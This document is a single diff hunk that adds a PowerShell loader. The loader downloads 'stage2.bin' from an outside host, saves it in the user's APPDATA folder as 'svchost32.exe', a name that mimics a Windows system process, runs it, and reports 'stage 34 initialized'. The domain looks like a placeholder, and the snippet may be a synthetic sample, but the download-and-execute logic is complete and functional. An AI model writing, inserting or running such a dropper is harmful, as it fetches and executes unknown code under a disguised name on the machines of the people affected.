@@ -1,0 +1,1 @@
+try { $DownloadUrl = "https://adatum.com/cdn/stage2.bin"; $WorkingPath = "$env:APPDATA\svchost32.exe"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $WorkingPath -UseBasicParsing; & $WorkingPath; Write-Output "stage 34 initialized" } catch { Write-Warning "Loader step failed" }
